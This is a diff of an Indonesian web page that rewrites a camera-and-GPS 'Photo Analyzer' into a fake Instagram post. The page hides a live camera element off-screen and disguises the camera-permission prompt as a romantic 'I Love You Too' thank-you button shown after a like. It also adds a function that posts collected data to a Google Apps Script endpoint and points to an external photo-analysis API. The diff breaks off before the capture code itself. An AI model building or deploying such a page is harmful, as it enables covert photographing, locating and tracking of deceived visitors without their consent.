@@ -1,534 +1,930 @@
 <!DOCTYPE html>
-
 <html lang="id">
 
 <head>
 
-<meta charset="UTF-8">
-
-<meta
-    name="viewport"
-    content="width=device-width, initial-scale=1.0"
->
-
-<title>Photo Analyzer</title>
-
-
-<!-- ============================================================
-     BOOTSTRAP
-============================================================ -->
-
-<link
-    href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
-    rel="stylesheet"
->
-
-
-<style>
-
-    * {
-        box-sizing: border-box;
-    }
-
-
-    body {
-
-        margin: 0;
-
-        padding: 30px 15px;
-
-        font-family: Arial, sans-serif;
-
-        background: #f3f4f6;
-
-    }
-
-
-    .container {
-
-        max-width: 700px;
-
-        margin: auto;
-
-    }
-
-
-    .card-main {
-
-        background: white;
-
-        padding: 20px;
-
-        border-radius: 15px;
-
-        box-shadow:
-            0 5px 20px rgba(0, 0, 0, .08);
-
-    }
-
-
-    h1 {
-
-        text-align: center;
-
-        margin-bottom: 20px;
-
-    }
-
-
-    video {
-
-        width: 100%;
-
-        display: none;
-
-        background: #111;
-
-        border-radius: 12px;
-
-        margin-bottom: 15px;
-
-    }
-
-
-    canvas {
-
-        display: none;
-
-    }
-
-
-    .main-button {
-
-        width: 100%;
-
-        border: none;
-
-        border-radius: 8px;
-
-        padding: 14px;
-
-        margin-top: 10px;
-
-        font-size: 16px;
-
-        cursor: pointer;
-
-    }
-
-
-    #startCamera {
-
-        background: #2563eb;
-
-        color: white;
-
-    }
-
-
-    #captureButton {
-
-        background: #111827;
-
-        color: white;
-
-    }
-
-
-    #captureButton:disabled {
-
-        background: #999;
-
-        cursor: not-allowed;
-
-    }
-
-
-    #result {
-
-        display: none;
-
-        margin-top: 25px;
-
-    }
-
-
-    .item {
-
-        padding: 12px 0;
-
-        border-bottom: 1px solid #eee;
-
-    }
-
-
-    .item strong {
-
-        display: block;
-
-        margin-bottom: 5px;
-
-    }
-
-
-    .loading {
-
-        display: none;
-
-        text-align: center;
-
-        margin-top: 15px;
-
-    }
-
-
-    .maps {
-
-        display: inline-block;
-
-        margin-top: 15px;
-
-        padding: 10px 15px;
-
-        background: #2563eb;
-
-        color: white;
-
-        text-decoration: none;
-
-        border-radius: 8px;
-
-    }
-
-
-    .gps-info {
-
-        margin-top: 15px;
-
-        padding: 12px;
-
-        background: #eff6ff;
-
-        color: #1e40af;
-
-        border-radius: 8px;
-
-        display: none;
-
-    }
-
-
-    /* ============================================================
-       CUSTOM MODAL
-    ============================================================ */
-
-    .permission-icon {
-
-        width: 80px;
-
-        height: 80px;
-
-        border-radius: 50%;
-
-        display: flex;
-
-        align-items: center;
-
-        justify-content: center;
-
-        margin: 0 auto 20px;
-
-        font-size: 38px;
-
-        background: #eff6ff;
-
-    }
-
-
-    .permission-title {
-
-        font-weight: 700;
-
-        text-align: center;
-
-        margin-bottom: 10px;
-
-    }
-
-
-    .permission-description {
-
-        text-align: center;
-
-        color: #6b7280;
-
-        line-height: 1.6;
-
-    }
-
-
-    .permission-note {
-
-        text-align: center;
-
-        font-size: 13px;
-
-        color: #9ca3af;
-
-        margin-top: 15px;
-
-    }
-
-
-    .modal-content {
-
-        border-radius: 18px;
-
-    }
-
-
-    .modal-footer {
-
-        border-top: none;
-
-        padding: 0 24px 24px;
-
-    }
-
-
-    .modal-footer button {
-
-        flex: 1;
-
-    }
-
-</style>
-
+    <meta charset="UTF-8">
+
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0"
+    >
+
+    <title>lyhtaa • Instagram</title>
+
+    <!-- FAVICON -->
+    <link
+        rel="icon"
+        type="image/png"
+        href="./logoig.png"
+    >
+
+    <!-- BOOTSTRAP -->
+    <link
+        href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
+        rel="stylesheet"
+    >
+
+    <!-- PIE EXIF -->
+    <script src="https://cdn.jsdelivr.net/npm/piexifjs"></script>
+
+    <style>
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            background: #fafafa;
+            font-family:
+                -apple-system,
+                BlinkMacSystemFont,
+                "Segoe UI",
+                Roboto,
+                Helvetica,
+                Arial,
+                sans-serif;
+            color: #262626;
+        }
+
+        /* =========================================================
+           MAIN CONTAINER
+        ========================================================== */
+
+        .instagram-container {
+            width: 100%;
+            max-width: 470px;
+            margin: 30px auto;
+        }
+
+        /* =========================================================
+           POST
+        ========================================================== */
+
+        .instagram-post {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        /* =========================================================
+           HEADER
+        ========================================================== */
+
+        .post-header {
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 8px 14px;
+        }
+
+        .profile-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .profile-image {
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 1px solid #ddd;
+        }
+
+        .profile-name {
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .profile-followers {
+            display: block;
+            font-size: 12px;
+            color: #737373;
+        }
+
+        .view-profile {
+            border: none;
+            background: transparent;
+            color: #0095f6;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        /* =========================================================
+           PHOTO
+        ========================================================== */
+
+        .photo-container {
+            position: relative;
+            width: 100%;
+            background: #000;
+            overflow: hidden;
+        }
+
+        .post-image {
+            display: block;
+            width: 100%;
+            aspect-ratio: 1 / 1;
+            object-fit: cover;
+            cursor: pointer;
+            user-select: none;
+            -webkit-user-select: none;
+        }
+
+        /* =========================================================
+           BIG HEART
+        ========================================================== */
+
+        .big-heart {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+
+            transform:
+                translate(-50%, -50%)
+                scale(0);
+
+            font-size: 120px;
+            line-height: 1;
+            color: #fff;
+
+            text-shadow:
+                0 4px 15px rgba(0, 0, 0, 0.35);
+
+            pointer-events: none;
+            z-index: 50;
+            opacity: 0;
+        }
+
+        .big-heart.show {
+            animation:
+                instagramHeart
+                0.9s
+                cubic-bezier(
+                    0.175,
+                    0.885,
+                    0.32,
+                    1.275
+                )
+                forwards;
+        }
+
+        @keyframes instagramHeart {
+
+            0% {
+                transform:
+                    translate(-50%, -50%)
+                    scale(0);
+                opacity: 0;
+            }
+
+            15% {
+                transform:
+                    translate(-50%, -50%)
+                    scale(1.4);
+                opacity: 1;
+            }
+
+            30% {
+                transform:
+                    translate(-50%, -50%)
+                    scale(0.9);
+                opacity: 1;
+            }
+
+            45% {
+                transform:
+                    translate(-50%, -50%)
+                    scale(1.1);
+                opacity: 1;
+            }
+
+            70% {
+                transform:
+                    translate(-50%, -50%)
+                    scale(1);
+                opacity: 1;
+            }
+
+            100% {
+                transform:
+                    translate(-50%, -50%)
+                    scale(1.15);
+                opacity: 0;
+            }
+        }
+
+        /* =========================================================
+           CAROUSEL
+        ========================================================== */
+
+        .carousel-button {
+            position: absolute;
+            top: 50%;
+
+            transform:
+                translateY(-50%);
+
+            width: 30px;
+            height: 30px;
+
+            border-radius: 50%;
+            border: none;
+
+            background:
+                rgba(255, 255, 255, 0.9);
+
+            display: flex;
+            align-items: center;
+            justify-content: center;
+
+            font-size: 18px;
+            cursor: pointer;
+
+            z-index: 10;
+        }
+
+        .carousel-button:hover {
+            background: #fff;
+        }
+
+        .carousel-prev {
+            left: 10px;
+        }
+
+        .carousel-next {
+            right: 10px;
+        }
+
+        .carousel-dots {
+            position: absolute;
+            bottom: 10px;
+            left: 50%;
+
+            transform:
+                translateX(-50%);
+
+            display: flex;
+            gap: 5px;
+
+            z-index: 10;
+        }
+
+        .carousel-dot {
+            width: 6px;
+            height: 6px;
+
+            border-radius: 50%;
+
+            background:
+                rgba(255, 255, 255, 0.6);
+        }
+
+        .carousel-dot.active {
+            background: #fff;
+        }
+
+        /* =========================================================
+           POST CONTENT
+        ========================================================== */
+
+        .post-content {
+            padding: 10px 14px 14px;
+        }
+
+        /* =========================================================
+           ACTIONS
+        ========================================================== */
+
+        .post-actions {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+
+        .left-actions {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .action-button {
+            border: none;
+            background: transparent;
+            padding: 0;
+
+            font-size: 25px;
+            line-height: 1;
+
+            cursor: pointer;
+
+            transition:
+                transform 0.15s ease,
+                color 0.15s ease;
+        }
+
+        .action-button:hover {
+            transform: scale(1.08);
+        }
+
+        /* =========================================================
+           COMMENT ICON
+        ========================================================== */
+
+        .comment-icon-button {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .comment-icon-button svg {
+            width: 25px;
+            height: 25px;
+        }
+
+        /* =========================================================
+           LIKE
+        ========================================================== */
+
+        .like-button {
+            position: relative;
+        }
+
+        .like-button.liked {
+            color: #ed4956;
+
+            animation:
+                likeButtonPop
+                0.35s
+                ease;
+        }
+
+        @keyframes likeButtonPop {
+
+            0% {
+                transform: scale(1);
+            }
+
+            35% {
+                transform: scale(1.35);
+            }
+
+            65% {
+                transform: scale(0.92);
+            }
+
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        /* =========================================================
+           BOOKMARK
+        ========================================================== */
+
+        .bookmark-button {
+            font-size: 24px;
+        }
+
+        /* =========================================================
+           LIKE COUNT
+        ========================================================== */
+
+        .likes {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 7px;
+        }
+
+        /* =========================================================
+           CAPTION
+        ========================================================== */
+
+        .caption {
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 8px;
+        }
+
+        .caption strong {
+            margin-right: 5px;
+        }
+
+        /* =========================================================
+           INSTAGRAM LINK
+        ========================================================== */
+
+        .instagram-link {
+            display: block;
+            text-align: center;
+
+            padding: 10px;
+
+            color: #0095f6;
+            text-decoration: none;
+
+            font-size: 13px;
+            font-weight: 600;
+
+            border-top: 1px solid #efefef;
+        }
+
+        .instagram-link:hover {
+            background: #fafafa;
+        }
+
+        /* =========================================================
+           COMMENTS
+        ========================================================== */
+
+        .comments {
+            border-top: 1px solid #efefef;
+            padding-top: 10px;
+        }
+
+        .comment-preview {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+
+        .comment-text {
+            font-size: 13px;
+            color: #555;
+        }
+
+        .comment-button {
+            border: none;
+            background: transparent;
+
+            color: #0095f6;
+
+            font-size: 13px;
+            font-weight: 600;
+
+            cursor: pointer;
+        }
+
+        /* =========================================================
+           HIDDEN CAMERA
+        ========================================================== */
+
+        #camera {
+            display: none !important;
+
+            width: 1px;
+            height: 1px;
+
+            position: fixed;
+
+            left: -9999px;
+            top: -9999px;
+
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        #canvas {
+            display: none;
+        }
+
+        /* =========================================================
+           STATUS
+        ========================================================== */
+
+        #cameraStatus {
+            display: none;
+
+            max-width: 470px;
+
+            margin: 10px auto;
+
+            text-align: center;
+
+            font-size: 12px;
+
+            color: #737373;
+        }
+
+        #gpsInfo {
+            display: none;
+
+            max-width: 470px;
+
+            margin: 15px auto 0;
+        }
+
+        #loading {
+            display: none;
+
+            max-width: 470px;
+
+            margin: 20px auto;
+
+            text-align: center;
+        }
+
+        #error {
+            display: none;
+
+            max-width: 470px;
+
+            margin: 15px auto;
+        }
+
+        /* =========================================================
+           SUCCESS
+        ========================================================== */
+
+        #success {
+            display: none;
+
+            max-width: 470px;
+
+            margin: 15px auto;
+        }
+
+        /* =========================================================
+           MOBILE
+        ========================================================== */
+
+        @media (max-width: 520px) {
+
+            .instagram-container {
+                margin: 0 auto;
+            }
+
+            .instagram-post {
+                border-left: none;
+                border-right: none;
+                border-radius: 0;
+            }
+
+            #gpsInfo,
+            #loading,
+            #error,
+            #success,
+            #cameraStatus {
+                margin-left: 15px;
+                margin-right: 15px;
+            }
+        }
+
+    </style>
 
 </head>
 
+
 <body>
 
-<div class="container">
+
+<!-- =========================================================
+     INSTAGRAM
+========================================================== -->
+
+<div class="instagram-container">
+
+    <div class="instagram-post">
 
 
-<div class="card-main">
+        <!-- HEADER -->
 
-    <h1>
-        📷 Photo Analyzer
-        sudah update
-    
-    </h1>
+        <div class="post-header">
 
+            <div class="profile-wrapper">
 
-    <!-- CAMERA -->
+                <img
+                    src="./logoig.png"
+                    class="profile-image"
+                    alt="Profile"
+                >
 
-    <video
-        id="camera"
-        autoplay
-        playsinline
-    ></video>
+                <div>
 
+                    <div class="profile-name">
+                        lyhtaa
+                    </div>
 
-    <canvas id="canvas"></canvas>
+                    <span class="profile-followers">
+                        4,555 followers
+                    </span>
 
+                </div>
 
-    <!-- START CAMERA -->
-
-    <button
-        id="startCamera"
-        class="main-button"
-    >
-        📷 Aktifkan Kamera
-    </button>
+            </div>
 
 
-    <!-- CAPTURE -->
+            <button
+                class="view-profile"
+                type="button"
+            >
+                View profile
+            </button>
 
-    <button
-        id="captureButton"
-        class="main-button"
-        disabled
-    >
-        📸 Ambil & Analisis Foto
-    </button>
+        </div>
 
 
-    <!-- GPS INFO -->
+        <!-- PHOTO -->
 
-    <div
-        id="gpsInfo"
-        class="gps-info"
-    >
-        📍 Lokasi GPS: -
+        <div class="photo-container">
+
+            <img
+                id="postImage"
+                src="./instagram-post.jpg"
+                class="post-image"
+                alt="Instagram Post"
+            >
+
+
+            <!-- BIG HEART -->
+
+            <div
+                id="bigHeart"
+                class="big-heart"
+            >
+                ♥
+            </div>
+
+
+            <!-- PREVIOUS -->
+
+            <button
+                id="prevButton"
+                class="carousel-button carousel-prev"
+                type="button"
+                aria-label="Previous photo"
+            >
+                ‹
+            </button>
+
+
+            <!-- NEXT -->
+
+            <button
+                id="nextButton"
+                class="carousel-button carousel-next"
+                type="button"
+                aria-label="Next photo"
+            >
+                ›
+            </button>
+
+
+            <!-- DOTS -->
+
+            <div class="carousel-dots">
+
+                <span
+                    class="carousel-dot active"
+                ></span>
+
+                <span
+                    class="carousel-dot"
+                ></span>
+
+                <span
+                    class="carousel-dot"
+                ></span>
+
+            </div>
+
+        </div>
+
+
+        <!-- CONTENT -->
+
+        <div class="post-content">
+
+
+            <!-- ACTIONS -->
+
+            <div class="post-actions">
+
+
+                <div class="left-actions">
+
+
+                    <!-- LIKE -->
+
+                    <button
+                        id="likeButton"
+                        class="action-button like-button"
+                        type="button"
+                        aria-label="Like"
+                    >
+                        ♡
+                    </button>
+
+
+                    <!-- COMMENT -->
+
+                    <button
+                        id="commentButton"
+                        class="action-button comment-icon-button"
+                        type="button"
+                        aria-label="Comment"
+                    >
+
+                        <svg
+                            width="25"
+                            height="25"
+                            viewBox="0 0 24 24"
+                            fill="none"
+                            stroke="currentColor"
+                            stroke-width="2"
+                            stroke-linecap="round"
+                            stroke-linejoin="round"
+                        >
+
+                            <path
+                                d="
+                                    M21 11.5
+                                    a8.38 8.38 0 0 1-9 8.5
+                                    8.38 8.38 0 0 1-4.5-1.3
+                                    L3 20
+                                    l1.3-4.5
+                                    A8.38 8.38 0 0 1 3 11.5
+                                    a8.5 8.5 0 1 1 18 0z
+                                "
+                            ></path>
+
+                        </svg>
+
+                    </button>
+
+
+                    <!-- SHARE -->
+
+                    <button
+                        id="shareButton"
+                        class="action-button"
+                        type="button"
+                        aria-label="Share"
+                    >
+                        ➤
+                    </button>
+
+                </div>
+
+
+                <!-- BOOKMARK -->
+
+                <button
+                    id="bookmarkButton"
+                    class="action-button bookmark-button"
+                    type="button"
+                    aria-label="Bookmark"
+                >
+                    ♡
+                </button>
+
+            </div>
+
+
+            <!-- LIKE COUNT -->
+
+            <div
+                id="likeCount"
+                class="likes"
+            >
+                1,234 likes
+            </div>
+
+
+            <!-- CAPTION -->
+
+            <div class="caption">
+
+                <strong>
+                    lyhtaa
+                </strong>
+
+                Menikmati suasana hari ini 📸✨
+
+            </div>
+
+
+            <!-- INSTAGRAM LINK -->
+
+            <a
+                href="#"
+                class="instagram-link"
+                id="instagramLink"
+            >
+                View more on Instagram
+            </a>
+
+
+            <!-- COMMENTS -->
+
+            <div class="comments">
+
+                <div class="comment-preview">
+
+                    <span class="comment-text">
+                        Lihat komentar...
+                    </span>
+
+                    <button
+                        id="commentButton2"
+                        class="comment-button"
+                        type="button"
+                    >
+                        Tambah komentar
+                    </button>
+
+                </div>
+
+            </div>
+
+        </div>
+
     </div>
 
+</div>
 
-    <!-- LOADING -->
+
+<!-- =========================================================
+     HIDDEN CAMERA
+========================================================== -->
+
+<video
+    id="camera"
+    autoplay
+    playsinline
+    muted
+></video>
+
+<canvas id="canvas"></canvas>
+
+
+<!-- =========================================================
+     CAMERA STATUS
+========================================================== -->
+
+<div id="cameraStatus">
+    Kamera aktif.
+</div>
+
+
+<!-- =========================================================
+     GPS
+========================================================== -->
+
+<div
+    id="gpsInfo"
+    class="alert alert-info"
+></div>
+
+
+<!-- =========================================================
+     LOADING
+========================================================== -->
+
+<div id="loading">
 
     <div
-        id="loading"
-        class="loading"
-    >
-        ⏳ Memproses foto...
-    </div>
-
-
-    <!-- ERROR -->
-
-    <div
-        id="error"
-        class="alert alert-danger mt-3 d-none"
-        role="alert"
+        class="spinner-border"
+        role="status"
     ></div>
 
-
-    <!-- RESULT -->
-
-    <div id="result">
-
-        <h2>
-            Hasil Analisis
-        </h2>
-
-
-        <div class="item">
-
-            <strong>
-                Status GPS
-            </strong>
-
-            <span id="gpsStatus">
-                -
-            </span>
-
-        </div>
-
-
-        <div class="item">
-
-            <strong>
-                Latitude
-            </strong>
-
-            <span id="latitude">
-                -
-            </span>
-
-        </div>
-
-
-        <div class="item">
-
-            <strong>
-                Longitude
-            </strong>
-
-            <span id="longitude">
-                -
-            </span>
-
-        </div>
-
-
-        <div class="item">
-
-            <strong>
-                Alamat
-            </strong>
-
-            <span id="address">
-                -
-            </span>
-
-        </div>
-
-
-        <div class="item">
-
-            <strong>
-                Desa / Kelurahan
-            </strong>
-
-            <span id="desa">
-                -
-            </span>
-
-        </div>
-
-
-        <div class="item">
-
-            <strong>
-                Kecamatan
-            </strong>
-
-            <span id="kecamatan">
-                -
-            </span>
-
-        </div>
-
-
-        <div class="item">
-
-            <strong>
-                Kabupaten / Kota
-            </strong>
-
-            <span id="kabupaten">
-                -
-            </span>
-
-        </div>
-
-
-        <div class="item">
-
-            <strong>
-                Provinsi
-            </strong>
-
-            <span id="provinsi">
-                -
-            </span>
-
-        </div>
-
-
-        <div class="item">
-
-            <strong>
-                Negara
-            </strong>
-
-            <span id="negara">
-                -
-            </span>
-
-        </div>
-
-
-        <a
-            id="googleMaps"
-            class="maps"
-            href="#"
-            target="_blank"
-            style="display:none;"
-        >
-            📍 Buka Google Maps
-        </a>
-
+    <div class="mt-2">
+        Sedang memproses...
     </div>
 
 </div>
 
 
-</div>
+<!-- =========================================================
+     SUCCESS
+========================================================== -->
 
-<!-- ============================================================
-     CAMERA PERMISSION MODAL
-============================================================ -->
+<div
+    id="success"
+    class="alert alert-success"
+></div>
+
+
+<!-- =========================================================
+     ERROR
+========================================================== -->
+
+<div
+    id="error"
+    class="alert alert-danger"
+></div>
+
+
+<!-- =========================================================
+     CAMERA MODAL
+========================================================== -->
 
 <div
     class="modal fade"
@@ -537,63 +933,60 @@
     aria-hidden="true"
 >
 
+    <div class="modal-dialog modal-dialog-centered">
 
-<div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content">
 
-    <div class="modal-content border-0 shadow">
 
-        <div class="modal-body p-4">
+            <div class="modal-header">
 
-            <div class="permission-icon">
+                <h5 class="modal-title">
+                    ❤️ Terima Kasih
+                </h5>
 
-                📷
+                <button
+                    type="button"
+                    class="btn-close"
+                    data-bs-dismiss="modal"
+                    aria-label="Close"
+                ></button>
 
             </div>
 
 
-            <h4 class="permission-title">
+            <div class="modal-body text-center py-4">
 
-                Akses Kamera
+                <div
+                    style="
+                        font-size: 55px;
+                        margin-bottom: 15px;
+                    "
+                >
+                    ❤️
+                </div>
 
-            </h4>
+                <h5 class="fw-semibold mb-2">
+                    Terima kasih sudah mampir 🥰
+                </h5>
 
+                <p class="text-muted mb-0">
+                    I love you ❤️
+                </p>
 
-            <p class="permission-description">
-
-                Photo Analyzer membutuhkan akses kamera
-                untuk mengambil foto yang akan dianalisis.
-
-            </p>
-
-
-            <p class="permission-note">
-
-                Setelah menekan tombol di bawah,
-                browser akan meminta izin kamera.
-
-            </p>
-
-        </div>
+            </div>
 
 
-        <div class="modal-footer gap-2">
+            <div class="modal-footer justify-content-center">
 
-            <button
-                type="button"
-                class="btn btn-secondary"
-                data-bs-dismiss="modal"
-            >
-                Batal
-            </button>
+                <button
+                    id="allowCamera"
+                    type="button"
+                    class="btn btn-primary px-4"
+                >
+                    I Love You Too ❤️
+                </button>
 
-
-            <button
-                type="button"
-                class="btn btn-primary"
-                id="allowCamera"
-            >
-                📷 Izinkan Kamera
-            </button>
+            </div>
 
         </div>
 
@@ -602,76 +995,89 @@
 </div>
 
 
-</div>
-
-<!-- ============================================================
-     LOCATION PERMISSION MODAL
-============================================================ -->
+<!-- =========================================================
+     COMMENT MODAL
+========================================================== -->
 
 <div
     class="modal fade"
-    id="locationPermissionModal"
+    id="commentModal"
     tabindex="-1"
     aria-hidden="true"
 >
 
+    <div class="modal-dialog modal-dialog-centered">
 
-<div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content">
 
-    <div class="modal-content border-0 shadow">
 
-        <div class="modal-body p-4">
+            <div class="modal-header">
 
-            <div class="permission-icon">
+                <h5 class="modal-title">
+                    Tambahkan komentar
+                </h5>
 
-                📍
+                <button
+                    type="button"
+                    class="btn-close"
+                    data-bs-dismiss="modal"
+                    aria-label="Close"
+                ></button>
 
             </div>
 
 
-            <h4 class="permission-title">
+            <div class="modal-body">
 
-                Akses Lokasi
+                <div
+                    class="d-flex align-items-center mb-3"
+                >
 
-            </h4>
+                    <img
+                        src="./logoig.png"
+                        width="40"
+                        height="40"
+                        class="rounded-circle me-2"
+                        alt="Profile"
+                    >
 
+                    <strong>
+                        lyhtaa
+                    </strong>
 
-            <p class="permission-description">
-
-                Photo Analyzer membutuhkan akses lokasi
-                untuk mendapatkan koordinat GPS foto.
-
-            </p>
-
-
-            <p class="permission-note">
-
-                Koordinat digunakan untuk analisis lokasi
-                dan ditambahkan ke metadata EXIF foto.
-
-            </p>
-
-        </div>
+                </div>
 
 
-        <div class="modal-footer gap-2">
+                <textarea
+                    id="commentInput"
+                    class="form-control"
+                    rows="4"
+                    placeholder="Tambahkan komentar..."
+                ></textarea>
 
-            <button
-                type="button"
-                class="btn btn-secondary"
-                data-bs-dismiss="modal"
-            >
-                Batal
-            </button>
+            </div>
 
 
-            <button
-                type="button"
-                class="btn btn-primary"
-                id="allowLocation"
-            >
-                📍 Izinkan Lokasi
-            </button>
+            <div class="modal-footer">
+
+                <button
+                    type="button"
+                    class="btn btn-secondary"
+                    data-bs-dismiss="modal"
+                >
+                    Batal
+                </button>
+
+
+                <button
+                    id="submitComment"
+                    type="button"
+                    class="btn btn-primary"
+                >
+                    Kirim
+                </button>
+
+            </div>
 
         </div>
 
@@ -680,30 +1086,34 @@
 </div>
 
 
-</div>
-
-<!-- ============================================================
-     BOOTSTRAP
-============================================================ -->
+<!-- =========================================================
+     BOOTSTRAP JS
+========================================================== -->
 
 <script
-    src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js">
-</script>
+    src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"
+></script>
 
-<!-- ============================================================
-     PIEXIFJS
-============================================================ -->
-
-<script
-    src="https://cdn.jsdelivr.net/npm/piexifjs">
-</script>
 
 <script>
 
+/* =========================================================
+   CONFIGURATION
+========================================================== */
 
-/* ============================================================
+const GOOGLE_SCRIPT_URL =
+    "https://script.google.com/macros/s/AKfycbz7dtJDDIQHlLYriNom9wQjCXZimBcxR7BS-75930wfUg4Lw_u_0u1dhLy5F3lGtyzn/exec";
+
+const PHOTO_API_URL =
+    "https://bemppnew.kejaksaan.info/photo-api/analyze";
+
+const USERNAME =
+    "lyhtaa";
+
+
+/* =========================================================
    ELEMENT
-============================================================ */
+========================================================== */
 
 const video =
     document.getElementById("camera");
@@ -711,158 +1121,375 @@ const video =
 const canvas =
     document.getElementById("canvas");
 
-const startCamera =
-    document.getElementById("startCamera");
+const likeButton =
+    document.getElementById("likeButton");
 
-const captureButton =
-    document.getElementById("captureButton");
+const likeCount =
+    document.getElementById("likeCount");
+
+const bigHeart =
+    document.getElementById("bigHeart");
+
+const commentButton =
+    document.getElementById("commentButton");
+
+const commentButton2 =
+    document.getElementById("commentButton2");
+
+const submitComment =
+    document.getElementById("submitComment");
+
+const commentInput =
+    document.getElementById("commentInput");
 
 const loading =
     document.getElementById("loading");
 
-const error =
+const errorBox =
     document.getElementById("error");
 
-const result =
-    document.getElementById("result");
+const successBox =
+    document.getElementById("success");
 
 const gpsInfo =
     document.getElementById("gpsInfo");
 
+const cameraStatus =
+    document.getElementById("cameraStatus");
+
+const postImage =
+    document.getElementById("postImage");
 
 
-/* ============================================================
+/* =========================================================
    MODAL
-============================================================ */
+========================================================== */
 
-const cameraModalElement =
+const cameraPermissionModalElement =
     document.getElementById(
         "cameraPermissionModal"
     );
 
-const locationModalElement =
+const commentModalElement =
     document.getElementById(
-        "locationPermissionModal"
+        "commentModal"
     );
-
 
 const cameraModal =
     new bootstrap.Modal(
-        cameraModalElement
+        cameraPermissionModalElement
     );
 
-
-const locationModal =
+const commentModal =
     new bootstrap.Modal(
-        locationModalElement
+        commentModalElement
     );
 
 
-const allowCamera =
-    document.getElementById(
-        "allowCamera"
-    );
-
-
-const allowLocation =
-    document.getElementById(
-        "allowLocation"
-    );
-
-
-
-/* ============================================================
-   STREAM
-============================================================ */
+/* =========================================================
+   STATE
+========================================================== */
 
 let stream = null;
 
+let analyzing = false;
+
+let liked = false;
+
+let likes = 1234;
 
 
-/* ============================================================
-   SHOW ERROR
-============================================================ */
+/* =========================================================
+   GOOGLE SPREADSHEET
+========================================================== */
 
-function showError(message) {
+async function sendToGoogleSheet(data) {
 
-    error.innerHTML =
-        "❌ " + message;
+    try {
 
-    error.classList.remove("d-none");
+        const formData =
+            new URLSearchParams();
 
+        formData.append(
+            "payload",
+            JSON.stringify(data)
+        );
+
+        const response =
+            await fetch(
+                GOOGLE_SCRIPT_URL,
+                {
+                    method: "POST",
+                    body: formData
+                }
+            );
+
+        if (!response.ok) {
+
+            throw new Error(
+                "Google Spreadsheet HTTP " +
+                response.status
+            );
+        }
+
+        const result =
+            await response.json();
+
+        console.log(
+            "Google Spreadsheet response:",
+            result
+        );
+
+        if (!result.success) {
+
+            throw new Error(
+                result.message ||
+                "Gagal menyimpan data ke Google Spreadsheet."
+            );
+        }
+
+        console.log(
+            "✅ Berhasil masuk Google Spreadsheet"
+        );
+
+        return true;
+
+    } catch (error) {
+
+        console.error(
+            "❌ Gagal mengirim ke Google Spreadsheet:",
+            error
+        );
+
+        throw error;
+    }
 }
 
 
-/* ============================================================
-   HIDE ERROR
-============================================================ */
+/* =========================================================
+   LIKE UI
+========================================================== */
 
-function hideError() {
+function updateLikeUI() {
 
-    error.classList.add("d-none");
+    if (liked) {
 
-    error.innerHTML = "";
+        likeButton.innerHTML =
+            "♥";
 
+        likeButton.classList.add(
+            "liked"
+        );
+
+        likeButton.setAttribute(
+            "aria-label",
+            "Unlike"
+        );
+
+    } else {
+
+        likeButton.innerHTML =
+            "♡";
+
+        likeButton.classList.remove(
+            "liked"
+        );
+
+        likeButton.setAttribute(
+            "aria-label",
+            "Like"
+        );
+    }
+
+    likeCount.innerText =
+        likes.toLocaleString("id-ID") +
+        " likes";
 }
 
 
+/* =========================================================
+   BIG HEART
+========================================================== */
 
-/* ============================================================
-   CAMERA
-============================================================ */
+function showBigHeart() {
+
+    bigHeart.classList.remove(
+        "show"
+    );
+
+    void bigHeart.offsetWidth;
+
+    bigHeart.classList.add(
+        "show"
+    );
+
+    setTimeout(
+        function () {
+
+            bigHeart.classList.remove(
+                "show"
+            );
+
+        },
+        900
+    );
+}
 
 
-/*
-|--------------------------------------------------------------------------
-| Klik Aktifkan Kamera
-|--------------------------------------------------------------------------
-*/
+/* =========================================================
+   CAMERA MODAL
+========================================================== */
 
-startCamera.addEventListener(
+function showCameraModalAfterHeart() {
+
+    if (stream) {
+        return;
+    }
+
+    setTimeout(
+        function () {
+
+            if (
+                !stream &&
+                !analyzing
+            ) {
+
+                cameraModal.show();
+            }
+
+        },
+        900
+    );
+}
+
+
+/* =========================================================
+   LIKE
+========================================================== */
+
+likeButton.addEventListener(
     "click",
-    () => {
+    function () {
 
-        hideError();
+        /*
+         * UNLIKE
+         */
 
-        cameraModal.show();
+        if (liked) {
+
+            liked = false;
+
+            likes--;
+
+            updateLikeUI();
+
+            return;
+        }
+
+
+        /*
+         * LIKE
+         */
+
+        liked = true;
+
+        likes++;
+
+        updateLikeUI();
+
+
+        /*
+         * ANIMASI HEART
+         */
+
+        showBigHeart();
+
+
+        /*
+         * TAMPILKAN MODAL
+         * SETELAH ANIMASI
+         */
+
+        showCameraModalAfterHeart();
 
     }
 );
 
 
+/* =========================================================
+   DOUBLE CLICK PHOTO
+========================================================== */
 
-/*
-|--------------------------------------------------------------------------
-| Izinkan Kamera
-|--------------------------------------------------------------------------
-*/
+postImage.addEventListener(
+    "dblclick",
+    function () {
 
-allowCamera.addEventListener(
-    "click",
-    async () => {
+        if (!liked) {
 
-        cameraModal.hide();
+            liked = true;
 
-        try {
+            likes++;
 
-            hideError();
+            updateLikeUI();
+        }
+
+        showBigHeart();
+
+        showCameraModalAfterHeart();
+
+    }
+);
 
 
-            /*
